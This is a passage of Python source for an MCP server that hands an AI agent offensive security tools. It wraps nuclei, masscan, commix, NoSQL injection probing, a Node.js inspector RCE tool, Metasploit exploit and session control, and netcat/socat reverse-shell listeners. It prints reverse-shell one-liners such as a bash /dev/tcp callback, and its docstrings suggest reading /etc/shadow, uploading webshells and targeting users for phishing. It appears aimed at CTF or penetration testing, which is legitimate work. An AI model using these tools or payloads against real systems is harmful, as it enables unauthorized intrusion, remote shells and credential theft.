                            Returns a job_id; the parsed findings are NOT included —
                            retrieve them via scan_wait() and the nuclei_json path in the result.

        Returns:
            Structured nuclei_findings list (each with: template-id, info{name,severity,tags},
            matched-at, curl-command, etc.) + raw stdout.

        Examples:
            nuclei_scan('http://10.10.10.5', scan_type='cves')
            nuclei_scan('http://10.10.10.5', severity='high,critical')
            nuclei_scan('http://10.10.10.5', templates='cves/2021/CVE-2021-44228')
            nuclei_scan('10.10.10.5', scan_type='misconfig', severity='medium,high')
            nuclei_scan('http://10.10.10.5', scan_type='full', background=True)  # long run
        """
        console.print(f"[bold yellow]\U0001f50e Nuclei scan:[/] {target}"
                      + (f"  [dim]type={scan_type}[/]" if scan_type else "")
                      + (f"  [dim]severity={severity}[/]" if severity else "")
                      + ("  [yellow](background)[/]" if background else ""))
        # FIX: clamp the numerics — concurrency=10^6 became `nuclei -c 1000000`
        # (resource exhaustion server-side); rate_limit/timeout likewise
        concurrency = max(1, min(int(concurrency), 100))
        rate_limit = max(1, min(int(rate_limit), 2000))
        timeout_secs = max(1, min(int(timeout_secs), 120))
        result = await client.post("/api/tools/nuclei", {
            "target": target, "scan_type": scan_type, "templates": templates,
            "severity": severity, "tags": tags, "template_dir": template_dir,
            "rate_limit": rate_limit, "concurrency": concurrency,
            "timeout_secs": timeout_secs, "additional_args": additional_args,
            "background": background,
        })

        findings = result.get("nuclei_findings", [])
        if findings:
            t = Table(title=f"\U0001f4a5 Nuclei Findings ({len(findings)})", box=box.ROUNDED,
                      title_style="bold red", header_style="bold cyan", show_lines=True)
            t.add_column("Template", style="cyan", max_width=40)
            t.add_column("Severity", justify="center")
            t.add_column("Name", max_width=50)
            t.add_column("Matched", style="yellow", max_width=35)
            SEV_STYLE = {"critical": "bold red", "high": "red", "medium": "yellow",
                         "low": "green", "info": "dim"}
            for f in findings[:30]:
                info = f.get("info", {})
                sev = info.get("severity", "info")
                t.add_row(
                    f.get("template-id", "") or f.get("templateID", ""),
                    f"[{SEV_STYLE.get(sev,'dim')}]{sev}[/]",
                    info.get("name", "")[:60],
                    f.get("matched-at", "") or f.get("matched", ""),
                )
            console.print(t)
        elif result.get("success") and not background:
            console.print(f"[green]\u2705 Nuclei scan complete — no vulnerabilities found[/]")
        elif background and "job_id" in result:
            console.print("[yellow]🚀 Nuclei running in background — use scan_status/scan_wait to follow[/]")
        elif result.get("diagnostic") == "binary_missing":
            console.print(f"[red]\u274c Nuclei not installed. {result.get('suggestion', '')}[/]")

        # Auto-save CVEs from nuclei findings
        # FIX: 'reference' may be a single string — iterate safely
        cve_ids = []
        for f in findings:
            if not isinstance(f, dict):
                continue
            info = f.get("info") or {}
            if not isinstance(info, dict):
                info = {}
            refs = info.get("reference") or []
            if isinstance(refs, str):
                refs = [refs]
            for ref in refs:
                m = re.search(r'CVE-\d{4}-\d+', str(ref))
                if m:
                    cve_ids.append(m.group(0))
        if cve_ids:
            console.print(f"[bold red]\U0001f6a8 CVEs from Nuclei:[/] {', '.join(set(cve_ids))}")

        return result

    @mcp.tool(name="curl_request")
    async def curl_request(url: str, method: str = "GET",
                            headers: Optional[Dict[str,str]] = None,
                            data: str = "", additional_args: str = "-sk",
                            encode_url: bool = False) -> Dict:
        """Single curl HTTP request.

        Args:
            url:            Target URL. Spaces / special chars / quotes are now
                            handled safely regardless of encode_url.
            encode_url:     If True, percent-encode unsafe chars in path/query.
                            Preserves already-encoded %xx sequences so existing
                            SQLi payloads still work. Default False.
        """
        return await client.post("/api/tools/curl", {
            "url": url, "method": method,
            "headers": headers or {}, "data": data,
            "additional_args": additional_args, "encode_url": encode_url
        })

    @mcp.tool(name="multi_curl")
    async def multi_curl(urls: List[str], method: str = "GET",
                          headers: Optional[Dict[str,str]] = None,
                          additional_args: str = "-sk",
                          encode_url: bool = False) -> Dict:
        """
        Send up to 20 curl requests SIMULTANEOUSLY.
        Returns all responses when all complete.

        Args:
            urls:        List of target URLs (up to 20).
            encode_url:  If True, percent-encode unsafe chars in path/query of each URL.
        """
        # FIX (M5b): docstring said "up to 20" but NOTHING enforced it — the
        # server gathered one curl subprocess per URL with no cap either.
        # 200 URLs = 200 concurrent subprocesses + a 2MB response dump.
        urls = urls[:20]
        console.print(f"[cyan]🌐 Multi-curl:[/] {len(urls)} requests simultaneously")
        reqs = [{"url": u, "method": method, "headers": headers or {}, "data": "",
                 "additional_args": additional_args, "encode_url": encode_url}
                for u in urls]
        return await client.post("/api/tools/multi_curl", {"requests": reqs})

    @mcp.tool(name="node_inspector_rce")
    async def node_inspector_rce(command: str = "", host: str = "127.0.0.1",
                                 port: int = 9229, expression: str = "",
                                 title_filter: str = "", timeout: float = 15.0) -> Dict:
        """Run a command by abusing an unauthenticated Node.js inspector
        (node --inspect[=host:port]). Connects to the CDP WebSocket and sends
        Runtime.evaluate, which executes inside the debugged Node process with
        the service account's privileges — RCE without a shell.

        Args:
            host:         Inspector host (usually 127.0.0.1 on the target; use a
                          tunnel/forwarded port if the inspector is loopback-only).
            port:         Inspector port (default 9229).
            command:      Shell command to run via child_process.execSync.
            expression:   Alternative: raw JS expression to evaluate (overrides command).
            title_filter: Pick the /json target whose title contains this string
                          (default: first target).
            timeout:      Per-network operation timeout.
        """
        return await client.post("/api/tools/node_inspector", {
            "host": host, "port": port, "command": command,
            "expression": expression, "title_filter": title_filter, "timeout": timeout
        })

    @mcp.tool(name="nosql_prober")
    async def nosql_prober(url: str, method: str = "POST",
                          username_field: str = "username",
                          password_field: str = "password",
                          body_format: str = "urlencoded",
                          headers: Optional[Dict[str,str]] = None,
                          ok_codes: Optional[List[int]] = None,
                          timeout: float = 15.0) -> Dict:
        """Probe an HTTP login endpoint for NoSQL operator injection
        (MongoDB/NeDB `$ne`-style). Posts a baseline of bogus creds, then fires
        a battery of `$ne/$gt/$regex/$exists` payloads (urlencoded + JSON). A
        payload whose status/Location differs from the baseline is flagged —
        this covers the login bypass that sqlmap (SQL-only) cannot.

        Args:
            url:            Login endpoint (e.g. http://host/login).
            method:         HTTP method (default POST).
            username_field: Username parameter name.
            password_field: Password parameter name.
            body_format:    'urlencoded' (default) or 'json'.
            headers:        Extra headers.
            ok_codes:       Status codes that mean a successful auth
                            (default [200, 201, 302]).
            timeout:        Per-request timeout.
        """
        return await client.post("/api/tools/nosql_prober", {
            "url": url, "method": method, "username_field": username_field,
            "password_field": password_field, "body_format": body_format,
            "headers": headers or {}, "ok_codes": ok_codes or [200, 201, 302],
            "timeout": timeout
        })

    @mcp.tool(name="exiftool")
    async def exiftool(path: str, additional_args: str = "") -> Dict:
        """Extract metadata from any file on the Adara server (images, PDFs,
        Office docs, audio, firmware). Great for CTF stego/metadata recon and
        for spotting author/comment/GPS/camera fingerprints dropped by a
        target. Pure CLI (exiftool).

        Args:
            path:            Absolute path to the file (on the Adara box).
            additional_args: Extra exiftool args, e.g. '-a -u' for all tags.
        """
        return await client.post("/api/tools/exiftool", {
            "path": path, "additional_args": additional_args
        })

    @mcp.tool(name="binwalk")
    async def binwalk(path: str, extract: bool = False, additional_args: str = "") -> Dict:
        """Signature-scan a file for embedded/concatenated content (firmware
        headers, ZIPs, squashfs, PNGs hidden inside other files). Optionally
        carve/extract everything found into '<file>_extracted/'. Pure CLI.

        Args:
            path:            File/image/firmware to scan.
            extract:         If True, run 'binwalk -e' to carve embedded files.
            additional_args: Extra binwalk args (e.g. '-y zip').
        """
        return await client.post("/api/tools/binwalk", {
            "path": path, "extract": extract, "additional_args": additional_args
        })

    @mcp.tool(name="foremost")
    async def foremost(path: str, out_dir: str = "/tmp/foremost_out",
                       additional_args: str = "") -> Dict:
        """Carve/recover files from a raw dump, disk image or deleted-media
        blob by magic-number scanning. Recovers files normal listing can't
        see (deleted docs, hidden archives). Pure CLI (foremost).

        Args:
            path:            Raw dump/image to carve.
            out_dir:         Output directory for carved files.
            additional_args: File-type filter, e.g. '-t jpg,png,pdf,gif,zip'.
        """
        return await client.post("/api/tools/foremost", {
            "path": path, "out_dir": out_dir, "additional_args": additional_args
        })

    @mcp.tool(name="whatweb")
    async def whatweb(url: str, additional_args: str = "") -> Dict:
        """Web technology fingerprinting — identify CMS, frameworks, JS
        libraries, and server software on a URL. Complements wafw00f (which
        only detects WAFs). Pure CLI (whatweb).

        Args:
            url:             Target URL.
            additional_args: Extra args, e.g. '--log-json=/tmp/ww.json'.
        """
        return await client.post("/api/tools/whatweb", {
            "url": url, "additional_args": additional_args
        })

    @mcp.tool(name="masscan")
    async def masscan(target: str, ports: str = "1-65535", rate: int = 1000,
                      additional_args: str = "") -> Dict:
        """Ultra-fast whole-range/CIDR port discovery (masscan). Use BEFORE
        nmap: masscan sweeps a whole /24 in seconds to find open ports, then
        hand those to nmap/full_port_scan for deep enumeration. Requires root
        (server auto-prefixes sudo -n).

        Args:
            target:          IP, range, or CIDR (e.g. 10.0.0.0/24).
            ports:           Port spec (default 1-65535).
            rate:            Packets per second (default 1000).
            additional_args: Extra masscan args.
        """
        return await client.post("/api/tools/masscan", {
            "target": target, "ports": ports, "rate": rate,
            "additional_args": additional_args
        })

    @mcp.tool(name="dnsrecon")
    async def dnsrecon(target: str, scan_type: str = "std",
                       wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                       additional_args: str = "") -> Dict:
        """DNS enumeration — records, zone transfers, subdomain brute force.
        The MCP currently has no DNS tooling; this fills that gap. Pure CLI.

        Args:
            target:          Domain name (e.g. example.com).
            scan_type:       'std' (default), 'zone' (attempt zone transfer),
                             or 'brt' (subdomain brute force).
            wordlist:        Wordlist for 'brt' scan_type.
            additional_args: Extra dnsrecon args.
        """
        return await client.post("/api/tools/dnsrecon", {
            "target": target, "scan_type": scan_type, "wordlist": wordlist,
            "additional_args": additional_args
        })

    @mcp.tool(name="theHarvester")
    async def the_harvester(domain: str, sources: str = "all", limit: int = 500,
                            additional_args: str = "") -> Dict:
        """OSINT email + host discovery for a domain (theHarvester). Finds
        employee emails and subdomains from public sources — great for
        phishing/user-enum targeting and attack-surface mapping.

        Args:
            domain:          Target domain.
            sources:         'all' or specific (google, bing, linkedin, ...).
            limit:           Max results.
            additional_args: Extra args.
        """
        return await client.post("/api/tools/theHarvester", {
            "domain": domain, "sources": sources, "limit": limit,
            "additional_args": additional_args
        })

    @mcp.tool(name="cewl")
    async def cewl(url: str, depth: int = 2, min_length: int = 4,
                   output: str = "/tmp/cewl_wordlist.txt",
                   additional_args: str = "") -> Dict:
        """Generate a target-specific wordlist from a website's own words
        (cewl). Feed the result into hydra/john for much better cracking than
        a generic rockyou run. Writes to `output` on the Adara box.

        Args:
            url:             Site to crawl for words.
            depth:           Crawl depth.
            min_length:      Minimum word length to keep.
            output:          Wordlist output path.
            additional_args: Extra cewl args.
        """
        return await client.post("/api/tools/cewl", {
            "url": url, "depth": depth, "min_length": min_length,
            "output": output, "additional_args": additional_args
        })

    @mcp.tool(name="commix")
    async def commix(url: str, data: str = "", additional_args: str = "--batch",
                     background: bool = False) -> Dict:
        """Test for OS command injection (commix) — the RCE sibling of
        sqlmap. sqlmap only covers SQL injection; commix targets OS command
        execution in GET/POST parameters. Deep scans are slow; use
        background=True for large payload sets.

        Args:
            url:             Target URL (with injectable parameter).
            data:            POST body if injecting a POST param.
            additional_args: Extra commix args (default '--batch').
            background:      Run detached if True (returns a job_id).
        """
        return await client.post("/api/tools/commix", {
            "url": url, "data": data, "additional_args": additional_args,
            "background": background
        })

    @mcp.tool(name="searchsploit")
    async def searchsploit(query: str = "", cve: str = "",
                           additional_args: str = "") -> Dict:
        """Local Exploit-DB lookup (searchsploit) — offline exploit search by
        term or CVE id. Instant, no network needed. Complements the online
        CVE/PoC lookups already in the MCP.

        Args:
            query:           Free-text search (e.g. 'apache 2.4.49').
            cve:             CVE id (overrides query).
            additional_args: Extra searchsploit args.
        """
        return await client.post("/api/tools/searchsploit", {
            "query": query, "cve": cve, "additional_args": additional_args
        })

    @mcp.tool(name="smtp_user_enum")
    async def smtp_user_enum(host: str, port: int = 25, username_file: str = "",
                             usernames: str = "", additional_args: str = "") -> Dict:
        """SMTP user enumeration (VRFY/EXPN/RCPT) via smtp-user-enum. Confirms
        which usernames are valid on a mail server — useful to hand valid
        accounts to hydra for credential attacks.

        Args:
            host:            SMTP server host.
            port:            SMTP port (default 25).
            username_file:   Path to a username list on the Adara box.
            usernames:       Comma-separated inline usernames (alternative).
            additional_args: Extra args.
        """
        return await client.post("/api/tools/smtp_user_enum", {
            "host": host, "port": port, "username_file": username_file,
            "usernames": usernames, "additional_args": additional_args
        })

    @mcp.tool(name="davtest")
    async def davtest(url: str, directory: str = "",
                      additional_args: str = "") -> Dict:
        """Test WebDAV capabilities (davtest) — which file types can be
        uploaded AND executed on a WebDAV share (php, jsp, asp, etc.). If a
        type SUCCEEDs, you can upload a webshell.

        Args:
            url:             WebDAV base URL.
            directory:       Optional subdirectory.
            additional_args: Extra davtest args.
        """
        return await client.post("/api/tools/davtest", {
            "url": url, "directory": directory,
            "additional_args": additional_args
        })

    @mcp.tool(name="steghide")
    async def steghide(file: str, action: str = "extract", password: str = "",
                       output: str = "", additional_args: str = "") -> Dict:
        """Steganography extraction (steghide) — pull hidden files out of
        images/audio. Complements exiftool (metadata) + binwalk (signature
        carving) to complete the file-analysis chain. Pure CLI.

        Args:
            file:            Carrier file path on the Adara box.
            action:          'extract' (default) or 'info'.
            password:        Stego passphrase (extract).
            output:          Extract destination path.
            additional_args: Extra steghide args.
        """
        return await client.post("/api/tools/steghide", {
            "file": file, "action": action, "password": password,
            "output": output, "additional_args": additional_args
        })

    @mcp.tool(name="netcat_probe")
    async def netcat_probe(host: str, port: int, data_to_send: str = "", timeout: float = 10.0) -> Dict:
        """Non-interactive netcat probe — connect, send data, read banner/response.
        
        Default timeout is 10s (raised from 5s) to allow slow banners to arrive.
        If no banner is received, the result includes a diagnostic suggestion.
        """
        return await client.post("/api/tools/netcat_probe", {
            "host": host, "port": port, "data_to_send": data_to_send, "timeout": timeout
        })

    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    # METASPLOIT
    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    @mcp.tool(name="metasploit_run")
    async def metasploit_run(module: str, options: Optional[Dict[str,Any]] = None,
                              interactive: bool = False) -> Dict:
        """
        Run a Metasploit module.
        Set interactive=True to get a persistent msfconsole PTY session_id
        that you can interact with via session_send / session_read.
        
        For interactive sessions, after you get a session_id:
          1. session_read to see current output / prompt
          2. session_send with your commands (e.g. 'sessions -l', 'sessions -i 1')
          3. In meterpreter: send meterpreter commands directly
        """
        return await client.post("/api/tools/metasploit", {
            "module": module, "options": options or {}, "interactive": interactive
        })

    @mcp.tool(name="metasploit_interactive")
    async def metasploit_interactive(initial_commands: Optional[List[str]] = None) -> Dict:
        """
        Start an interactive msfconsole PTY session.
        Returns a session_id. Then use msf_interactive_run to run modules, or
        session_send (wait_for='msf6 >') / session_read to interact manually.
        
        The session persists — you can:
          • Run modules via msf_interactive_run (recommended)
          • List sessions: 'sessions -l'
          • Interact with meterpreter: 'sessions -i 1'
          • Run meterpreter commands: 'sysinfo', 'getuid', 'shell'
        """
        result = await client.post("/api/session/create", {
            "type": "msfconsole", "target": "metasploit", "port": 0
        })
        session_id = result.get("session_id")
        if not session_id:
            return result

        console.print(f"[green]🔥 msfconsole started:[/] session {session_id}")
        console.print(result.get("initial_output","")[:500])

        # Run initial commands if provided — wait up to 20s each for prompt
        outputs = []
        for cmd in (initial_commands or []):
            out = await client.post("/api/session/send", {
                "session_id": session_id, "command": cmd,
                "wait_for": "msf6 >", "read_timeout": 20.0
            })
            outputs.append({"command": cmd, "output": out.get("output","")})
            if out.get("output"):
                console.print(f"[dim]msf> {cmd}[/]\n{out['output'][:300]}")

        return {"session_id": session_id, "initial_output": result.get("initial_output",""),
                "command_outputs": outputs,
                "usage": "Use msf_interactive_run(session_id, module, options) to run modules"}

    @mcp.tool(name="msf_interactive_run")
    async def msf_interactive_run(
        session_id: str,
        module: str,
        options: Optional[Dict[str, Any]] = None,
        module_timeout: float = 300.0,
        payload: str = "",
        lhost: str = "",
        lport: int = 0,
        target_idx: Optional[int] = None,
        action: str = "",
        run_bg: bool = False,
    ) -> Dict:
        """
        Run ANY Metasploit module inside an existing msfconsole PTY session.
        Works universally for exploits, auxiliary scanners, post-exploitation,
        encoders, evasion modules, and multi/handler.

        Auto-handles:
          - use/set/run/wait-for-prompt sequence
          - Reverse payload LHOST/LPORT (auto-detects Adara IP)
          - Module type detection (exploit vs auxiliary vs post)
          - Session opened detection (shell, meterpreter, VNC, all types)
          - Failure reason detection (not vulnerable, timed out, etc.)
          - Background execution for long-running scanners (run_bg=True)

        Args:
            session_id:     Session ID from metasploit_interactive()
            module:         Module path, e.g.:
                            'exploit/unix/ftp/vsftpd_234_backdoor'
                            'exploit/windows/smb/ms17_010_eternalblue'
                            'exploit/multi/http/tomcat_mgr_upload'
                            'auxiliary/scanner/smb/smb_ms17_010'
                            'auxiliary/scanner/portscan/tcp'
                            'post/multi/recon/local_exploit_suggester'
                            'exploit/multi/handler'
            options:        Dict of options e.g. {'RHOSTS': '10.10.10.5', 'RPORT': '21'}
            module_timeout: Max seconds to wait for module to complete (default 120)
            payload:        Payload for exploits e.g. 'linux/x86/meterpreter/reverse_tcp'
                            If empty, uses module default payload
            lhost:          Callback IP for reverse payloads. Auto-detected if empty.
            lport:          Callback port for reverse payloads. Default 4444.
            target_idx:     Target index for multi-target exploits (set TARGET N)
            action:         Action for auxiliary modules with multiple actions
            run_bg:         Run in background (True) for scanners/handlers that don't return

        Returns:
            Structured dict: success, sessions_opened [{number, type}], module_type,
            privilege, failure_reasons, etc.
        """
        console.print(f"[bold yellow]💣 Running MSF module:[/] {module}")
        if payload:
            console.print(f"[dim]  payload={payload} lhost={lhost or 'auto'} lport={lport or 4444}[/]")

        result = await client.post("/api/session/msf_run", {
            "session_id": session_id,
            "module": module,
            "options": options or {},
            "module_timeout": module_timeout,
            "payload": payload,
            "lhost": lhost,
            "lport": lport,
            "target_idx": target_idx,
            "action": action,
            "run_bg": run_bg,
        })
        if result.get("success"):
            sessions = result.get("sessions_opened", [])
            console.print(f"[bold green]✅ Exploit succeeded! {len(sessions)} session(s) opened[/]")
            for s in sessions:
                console.print(f"  [green]Session {s['number']}[/]: {s['type']}")
            if result.get("privilege"):
                console.print(f"[bold green]🔑 Privilege: {result['privilege']}[/]")
        elif result.get("failure_reasons"):
            reasons = ", ".join(result["failure_reasons"])
            console.print(f"[red]❌ Exploit failed: {reasons}[/]")
        elif result.get("output"):
            mod_type = result.get("module_type", "module")
            # For auxiliary/post modules, "no session" is often normal (scanners)
            if mod_type in ("auxiliary", "post", "encoder", "evasion"):
                console.print(f"[green]✅ {mod_type.capitalize()} completed[/]")
                console.print(result["output"][:500])
            else:
                console.print(f"[yellow]⚠️  Module ran but no session opened[/]")
                console.print(result["output"][:500])
        return result

    @mcp.tool(name="msf_search")
    async def msf_search(session_id: str, query: str) -> Dict:
        """
        Search Metasploit modules by keyword, type, platform, CVE, etc.

        Args:
            session_id: Session ID from metasploit_interactive()
            query:      Search query. Examples:
                        'type:exploit platform:linux ftp'   — Linux FTP exploits
                        'name:vsftpd'                       — modules with vsftpd in name
                        'type:auxiliary scanner smb'        — SMB scanners
                        'cve:2021-44228'                    — Log4Shell modules
                        'type:post platform:linux'          — Linux post-exploitation
                        'platform:windows smb'              — Windows SMB modules
                        'type:exploit platform:linux ssh'   — Linux SSH exploits

        Returns:
            List of matching modules with name, rank, description.
        """
        console.print(f"[cyan]🔍 Searching MSF modules:[/] {query}")
        result = await client.post("/api/session/msf_search", {
            "session_id": session_id,
            "query": query,
        })
        modules = result.get("modules", [])
        if modules:
            t = Table(title=f"MSF Search: {query}", box=box.ROUNDED,
                      title_style="bold cyan", header_style="bold yellow", show_lines=True)
            t.add_column("Module", style="cyan")
            t.add_column("Rank", justify="center")
            t.add_column("Description", max_width=60)
            for m in modules[:30]:  # Show top 30
                t.add_row(
                    m.get("name", ""),
                    m.get("rank", ""),
                    m.get("description", "")[:80],
                )
            console.print(t)
            if len(modules) > 30:
                console.print(f"[dim]... and {len(modules) - 30} more results[/]")
        else:
            console.print(f"[yellow]No modules found for: {query}[/]")
        return result

    @mcp.tool(name="msf_info")
    async def msf_info(session_id: str, module: str) -> Dict:
        """
        Get detailed info and options for a Metasploit module.
        Shows: required/optional options with current values,
               available payloads, available targets.

        Args:
            session_id: Session ID from metasploit_interactive()
            module:     Module path e.g. 'exploit/unix/ftp/vsftpd_234_backdoor'

        Returns:
            Module info, options list, available payloads and targets.
        """
        console.print(f"[cyan]📋 Module info:[/] {module}")
        result = await client.post("/api/session/msf_info", {
            "session_id": session_id,
            "module": module,
        })
        if result.get("options"):
            t = Table(title=f"Options: {module}", box=box.SIMPLE_HEAD,
                      header_style="bold cyan")
            t.add_column("Name", style="yellow")
            t.add_column("Current")
            t.add_column("Required", justify="center")
            t.add_column("Description", max_width=50)
            for opt in result["options"][:20]:
                req = "[red]yes[/]" if opt.get("required") else "no"
                t.add_row(opt.get("name", ""), opt.get("current", ""), req,
                         opt.get("description", "")[:60])
            console.print(t)
        return result

    @mcp.tool(name="msf_session_interact")
    async def msf_session_interact(
        session_id: str,
        msf_session_num: int = 1,
        commands: Optional[List[str]] = None,
    ) -> Dict:
        """
        Interact with an opened Metasploit session (meterpreter or shell).
        Sends 'sessions -i N' then runs the given commands.
        For meterpreter: send meterpreter commands (sysinfo, getuid, download, etc.)
        For shell: send shell commands (id, whoami, cat /etc/shadow, etc.)

        Args:
            session_id:      MSF console session ID from metasploit_interactive()
            msf_session_num: MSF session number (from sessions_opened[0]['number'])
            commands:        List of commands to run inside the session.
                             If empty, just interacts and returns current output.

        Returns:
            Combined output from all commands run inside the session.
        """
        console.print(f"[bold cyan]🔗 Interacting with MSF session {msf_session_num}[/]")
        # Enter the session
        interact_result = await client.post("/api/session/send", {
            "session_id": session_id,
            "command": f"sessions -i {msf_session_num}",
            "wait_for": "",
            "read_timeout": 10.0,
        })
        outputs = [interact_result.get("output", "")]

        # Run each command inside the session — FIX: cap at 20 (N commands x
        # 16KB server window = unbounded context dump before)
        for cmd in (commands or [])[:20]:
            r = await client.post("/api/session/send", {
                "session_id": session_id,
                "command": cmd,
                "wait_for": "",
                "read_timeout": 15.0,
            })
            out = r.get("output", "")
            outputs.append(f"$ {cmd}\n{out}")
            if out:
                console.print(f"[dim cyan]❯ {cmd}[/]\n{out[:500]}")

        return {
            "session_id": session_id,
            "msf_session_num": msf_session_num,
            "output": "\n".join(outputs),
            "commands_run": commands or [],
        }

    @mcp.tool(name="msf_session_list")
    async def msf_session_list(session_id: str) -> Dict:
        """
        List all open Metasploit sessions (sessions -l).
        Shows session number, type, target, and info.

        Args:
            session_id: MSF console session ID from metasploit_interactive()
        """
        result = await client.post("/api/session/send", {
            "session_id": session_id,
            "command": "sessions -l",
            "wait_for": "msf6 >",
            "read_timeout": 10.0,
        })
        return result

    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    # PTY INTERACTIVE SESSION TOOLS
    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    @mcp.tool(name="session_create")
    async def session_create(
        session_type: str,
        port: int = 4444,
        target: str = "",
        auto_stabilize: bool = False,
    ) -> Dict:
        """
        Start an interactive PTY session.
        
        Types:
          netcat_listen  — nc -lvnp <port> — waits for incoming reverse shell
          msfconsole     — interactive Metasploit console  
          bash           — local bash shell on Adara
          socat          — socat listener with full TTY support (best for CTF reverse shells)
          direct_shell   — connects OUTWARD to target:port (e.g. vsftpd backdoor on 6200)

        After creating, use session_send to interact and session_read to see output.
        For netcat_listen: start the listener, then trigger your reverse shell on the target.
        For direct_shell: connects directly to a listening shell on the target.

        Args:
            session_type:    One of the session types above
            port:            Port for listeners (netcat_listen, socat) or target port (direct_shell)
            target:          Target IP for direct_shell connections
            auto_stabilize:  If True, automatically runs PTY upgrade (python pty.spawn + stty)
                             after connection. Saves an extra tool call — shell is ready to use.
                             Works for netcat_listen, direct_shell, socat session types.
        """
        result = await client.post("/api/session/create", {
            "type": session_type, "target": target, "port": port,
            "auto_stabilize": auto_stabilize,
        })
        if result.get("session_id"):
            console.print(f"[green]✅ Session created:[/] {result['session_id']} ({session_type})")
            if result.get("auto_stabilized"):
                console.print(f"[green]🔧 Shell auto-stabilized — ready for interactive use[/]")
            if session_type == "netcat_listen" and not auto_stabilize:
                # FIX: 'Adara_IP' was a literal placeholder that was never
                # substituted — the agent copied a dead payload. Substitute
                # the real server host from the client base URL.
                try:
                    import urllib.parse as _up
                    server_host = _up.urlparse(client.base).hostname or "Adara_IP"
                except Exception:
                    server_host = "Adara_IP"
                console.print(f"[yellow]⏳ Listening on port {port} — trigger your reverse shell:[/]")
                console.print(f"  bash -i >& /dev/tcp/{server_host}/{port} 0>&1")
                console.print(f"  python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{server_host}',{port}));...\"")
                console.print(f"[dim]Tip: set auto_stabilize=True to skip manual session_upgrade_shell call[/]")
        return result

    @mcp.tool(name="session_send")
    async def session_send(
        session_id: str,
        command: str,
        wait_for: str = "",
        read_timeout: float = 15.0,
    ) -> Dict:
        """
        Send a command to an interactive PTY session (netcat shell, msfconsole, bash, SSH).
        
        Args:
            session_id:   Session ID from session_create / ssh_connect
            command:      Command to send (e.g. 'id', 'whoami', 'sessions -l')
            wait_for:     Wait until this string appears in output.
                          IMPORTANT — msfconsole's real prompt (after ANSI strip) is
                          'msf6 >' (with a space before >). Use that exact string.
                          For meterpreter: 'meterpreter >'
                          For bash shell: '$' or '#'
            read_timeout: Seconds to wait for output (default 15 — MSF needs time)
            
        Tips:
          • For msfconsole: wait_for='msf6 >' (note the space)
          • For long operations (exploits): use read_timeout=60 or more
          • Prefer msf_interactive_run for running full modules — it handles all
            the set/run/wait logic automatically
        """
        result = await client.post("/api/session/send", {
            "session_id": session_id, "command": command,
            "wait_for": wait_for, "read_timeout": read_timeout
        })
        if result.get("output"):
            console.print(f"[dim cyan]❯ {command}[/]")
            console.print(result["output"][:1000])
        return result

    @mcp.tool(name="session_read")
    async def session_read(session_id: str, timeout: float = 8.0) -> Dict:
        """
        Read pending output from a session without sending anything.
        Use this to check if a reverse shell has connected, see MSF output, etc.
        """
        result = await client.post("/api/session/read", {
            "session_id": session_id, "timeout": timeout
        })
        if result.get("output"):
            console.print(result["output"][:2000])
        return result

    @mcp.tool(name="session_list")
    async def session_list() -> Dict:
        """List all active PTY sessions (netcat, msfconsole, bash) with metadata."""
        result = await client.get("/api/session/list")
        sessions = result.get("sessions", [])
        if sessions:
            print_sessions_table(sessions)
        else:
            console.print("[dim]No active sessions[/]")
        return result

    @mcp.tool(name="session_status")
    async def session_status(session_id: str) -> Dict:
        """
        Get structured status for a session.
        Returns: is_alive, type, target, metadata (exploit, is_root, shell_type),
                 uptime_sec, buffered_chunks (pending output count), pid.
        Useful for the AI to know what shells it has and their state.
        """
        result = await client.get(f"/api/session/{session_id}/status")
        # FIX: Handle 404 gracefully — session may have been killed already
        if "error" in result:
            err_str = str(result.get("error", ""))
            if "404" in err_str or "not found" in err_str.lower():
                console.print(f"[yellow]⚠️  Session {session_id} not found[/] (it may have already been killed)")
                console.print(f"[dim]Use session_list() to see active sessions[/]")
                return {
                    "session_id": session_id,
                    "is_alive": False,
                    "error": "Session not found — may have been killed or expired",
                    "suggestion": "Use session_list() to see remaining active sessions",
                }
            console.print(f"[red]❌ session_status error: {result.get('error')}[/]")
            return result
        alive = "[green]ALIVE[/]" if result.get("is_alive") else "[red]DEAD[/]"
        meta = result.get("metadata", {})
        buf = result.get("buffered_chunks", 0)
        console.print(f"[cyan]Session {session_id}[/]: {alive} | {result.get('type')} | "
                     f"target={result.get('target')} | uptime={result.get('uptime_sec')}s"
                     + (f" | [yellow]{buf} chunks pending[/]" if buf else ""))
        if meta.get("exploit"):
            console.print(f"  exploit={meta['exploit']} root={meta.get('is_root')}")
        return result

    @mcp.tool(name="session_kill")
    async def session_kill(session_id: str) -> Dict:
        """Kill and remove a PTY session."""
        return await client.delete(f"/api/session/{session_id}")

    @mcp.tool(name="session_upgrade_shell")
    async def session_upgrade_shell(session_id: str) -> Dict:
        """
        Upgrade a dumb reverse shell (netcat) to a full interactive PTY.
        Automatically runs python3 pty spawn + stty + TERM setup.
        Call this right after a reverse shell connects to your netcat listener.
        """
        result = await client.post("/api/session/upgrade_shell", {
            "session_id": session_id, "command": "", "read_timeout": 5.0
        })
        # FIX: don't claim success when the server returned an error
        if "error" in result:
            console.print(f"[red]❌ Shell upgrade failed: {result['error']}[/]")
        else:
            console.print("[green]✅ Shell upgraded to full PTY[/]")
        return result

    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    # POST-EXPLOITATION TOOLS
    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    async def _session_alive(session_id: str) -> bool:
        """Fast-fail liveness probe — avoids burning 5+ minutes of read timeouts
        running post_enum commands against a dead/dumb shell."""
        try:
            st = await client.get(f"/api/session/{session_id}/status")
            if st.get("is_alive") is False:
                return False
            probe = await client.post("/api/session/send", {
                "session_id": session_id, "command": "echo ALIVE_MARKER_$$",
                "wait_for": "ALIVE_MARKER", "read_timeout": 6.0
            })
            return bool(probe.get("output", ""))
        except Exception:
            return False

    async def _try_stabilize_shell(session_id: str) -> bool:
        """Attempt to auto-stabilize a dumb shell before running commands.
        Returns True if stabilization commands were sent."""
        # Fast-fail: if the session is already dead, don't burn read timeouts
        if not await _session_alive(session_id):
            return False
        # Try common PTY spawn methods -- some may fail, that's OK
        stabilization_cmds = [
            'python3 -c "import pty;pty.spawn(\\"/bin/bash\\")" 2>/dev/null || true',
            'python -c "import pty;pty.spawn(\\"/bin/bash\\")" 2>/dev/null || true',
